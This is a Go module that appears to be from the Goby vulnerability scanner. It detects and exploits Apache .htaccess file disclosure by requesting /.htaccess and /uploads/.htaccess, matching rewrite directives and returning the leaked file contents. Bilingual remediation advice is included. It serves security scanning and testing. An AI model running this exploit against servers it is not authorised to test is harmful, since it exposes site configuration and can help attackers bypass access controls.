package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Aapche .htaccess file information leakage vulnerability",
    "Description": "<p>The .htaccess file is a special file in Apache that provides a method to change the configuration of a directory, that is, place a file containing one or more instructions in a specific document directory to act on this directory and all its subdirectories. Table of contents.</p><p>The leakage of the contents of the .htaccess file may lead to server configuration information being exposed, permission control being bypassed, etc.</p>",
    "Product": "APACHE-HTTP_Server",
    "Homepage": "https://www.apache.org/",
    "DisclosureDate": "2023-12-21",
    "PostTime": "2023-12-21",
    "Author": "Gryffinbit@gmail.com",
    "FofaQuery": "protocol=\"http\" || protocol=\"https\"",
    "GobyQuery": "protocol=\"http\" || protocol=\"https\"",
    "Level": "2",
    "Impact": "<p>The leakage of the contents of the .htaccess file may lead to server configuration information being exposed, permission control being bypassed, etc.</p>",
    "Recommendation": "<p>Solutions to prevent the leakage of .htaccess file contents mainly include the following points:</p><p>1. Disable or restrict .htaccess files: If you have access to the main server configuration file, you should try to avoid using .htaccess files. Any directives that can be included in the .htaccess file are best set in a Directory block as this will result in better performance.</p><p>2. Strict permission control: Access to .htaccess files should be restricted so that only necessary personnel can access and modify these files.</p><p>3. Handling of sensitive information: Avoid storing sensitive information in .htaccess files. If this must be done, the information should be appropriately encrypted or hashed.</p><p>4. Error handling: Ensure that server error messages do not reveal information about the .htaccess file.</p><p>5. Monitoring and logging: Regularly check server logs for any signs that may indicate unauthorized access to .htaccess files.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "htaccess",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Information Disclosure"
    ],
    "VulType": [
        "Information Disclosure"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.5",
    "Translation": {
        "CN": {
            "Name": "Aapche .htaccess 文件信息泄漏漏洞",
            "Product": "APACHE-HTTP_Server",
            "Description": "<p>.htaccess 文件是 Apache 中有一种特殊的文件，其提供了针对目录改变配置的方法，即在一个特定的文档目录中放置一个包含一条或多条指令的文件，以作用于此目录及其所有子目录。</p><p>.htaccess 文件内容的泄露可能会导致服务器配置信息暴露，权限控制被绕过等。</p>",
            "Recommendation": "<p>防止 .htaccess 文件内容泄露的解决方案主要包括以下几点：</p><p>1. 禁用或限制 .htaccess 文件：如果你有访问主服务器配置文件的权限，你应该尽量避免使用 .htaccess 文件。任何可以在 .htaccess 文件中包含的指令，最好在Directory 块中设置，因为这样会有更好的性能。</p><p>2. 严格的权限控制：应该限制对 .htaccess 文件的访问权限，只有必要的人员才能访问和修改这些文件。</p><p>3. 敏感信息处理：避免在 .htaccess 文件中存储敏感信息。如果必须这样做，应该对这些信息进行适当的加密或哈希处理。</p><p>4. 错误处理：确保服务器的错误消息不会泄露 .htaccess 文件的信息。</p><p>5. 监控和日志记录：定期检查服务器日志，寻找任何可能指示 .htaccess 文件被未经授权访问的迹象。</p>",
            "Impact": "<p>.htaccess 文件内容的泄露可能会导致服务器配置信息暴露，权限控制被绕过等。<br></p>",
            "VulType": [
                "信息泄露"
            ],
            "Tags": [
                "信息泄露"
            ]
        },
        "EN": {
            "Name": "Aapche .htaccess file information leakage vulnerability",
            "Product": "APACHE-HTTP_Server",
            "Description": "<p>The .htaccess file is a special file in Apache that provides a method to change the configuration of a directory, that is, place a file containing one or more instructions in a specific document directory to act on this directory and all its subdirectories. Table of contents.</p><p>The leakage of the contents of the .htaccess file may lead to server configuration information being exposed, permission control being bypassed, etc.</p>",
            "Recommendation": "<p>Solutions to prevent the leakage of .htaccess file contents mainly include the following points:</p><p>1. Disable or restrict .htaccess files: If you have access to the main server configuration file, you should try to avoid using .htaccess files. Any directives that can be included in the .htaccess file are best set in a Directory block as this will result in better performance.</p><p>2. Strict permission control: Access to .htaccess files should be restricted so that only necessary personnel can access and modify these files.</p><p>3. Handling of sensitive information: Avoid storing sensitive information in .htaccess files. If this must be done, the information should be appropriately encrypted or hashed.</p><p>4. Error handling: Ensure that server error messages do not reveal information about the .htaccess file.</p><p>5. Monitoring and logging: Regularly check server logs for any signs that may indicate unauthorized access to .htaccess files.</p>",
            "Impact": "<p>The leakage of the contents of the .htaccess file may lead to server configuration information being exposed, permission control being bypassed, etc.<br></p>",
            "VulType": [
                "Information Disclosure"
            ],
            "Tags": [
                "Information Disclosure"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10899"
}`
	sendPayload83fYfbF8rgRGf83 := func(hostInfo *httpclient.FixUrl, uri string) (*httpclient.HttpResponse, error) {
		payloadConfig := httpclient.NewGetRequestConfig(uri)
		payloadConfig.VerifyTls = false
		payloadConfig.FollowRedirect = false
		return httpclient.DoHttpRequest(hostInfo, payloadConfig)
	}
	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(poc *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, stepLogs *scanconfig.SingleScanConfig) bool {
			for _, path := range []string{"/.htaccess", "/uploads/.htaccess"} {
				resp, _ := sendPayload83fYfbF8rgRGf83(hostInfo, path)
				if resp != nil && resp.StatusCode == 200 && (strings.Contains(resp.Utf8Html, "RewriteBase") || strings.Contains(resp.Utf8Html, "RewriteCond") || strings.Contains(resp.Utf8Html, "RewriteEngine") || strings.Contains(resp.Utf8Html, "RewriteRule") || strings.Contains(resp.Utf8Html, "Order allow")) {
					stepLogs.VulURL = hostInfo.FixedHostInfo + resp.Request.URL.Path
					return true
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, stepLogs *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := goutils.B2S(stepLogs.Params["attackType"])
			if attackType == "htaccess" {
				for _, path := range []string{"/.htaccess", "/uploads/.htaccess"} {
					resp, err := sendPayload83fYfbF8rgRGf83(expResult.HostInfo, path)
					if resp != nil && resp.StatusCode == 200 && (strings.Contains(resp.Utf8Html, "RewriteBase") || strings.Contains(resp.Utf8Html, "RewriteCond") || strings.Contains(resp.Utf8Html, "RewriteEngine") || strings.Contains(resp.Utf8Html, "RewriteRule") || strings.Contains(resp.Utf8Html, "Order allow")) {
						expResult.OutputType = "html"
						expResult.Success = true
						expResult.Output = resp.Utf8Html
						break
					} else if resp == nil && err != nil {
						expResult.Output = err.Error()
						break
					} else {
						expResult.Output = "漏洞利用失败"
					}
				}
			} else {
				expResult.Success = false
				expResult.Output = "未知的利用方式"
			}
			return expResult
		},
	))
}
